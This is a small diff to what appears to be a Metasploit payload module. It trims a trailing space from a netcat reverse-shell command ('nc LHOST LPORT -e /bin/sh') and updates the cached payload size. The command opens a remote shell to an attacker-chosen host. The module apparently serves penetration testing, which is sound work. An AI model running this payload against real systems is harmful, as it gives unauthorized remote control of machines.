@@ -9,7 +9,7 @@ require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 35
+  CachedSize = 34
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -45,6 +45,6 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    "nc #{datastore['LHOST']} #{datastore['LPORT']} -e /bin/sh "
+    "nc #{datastore['LHOST']} #{datastore['LPORT']} -e /bin/sh"
   end
 end
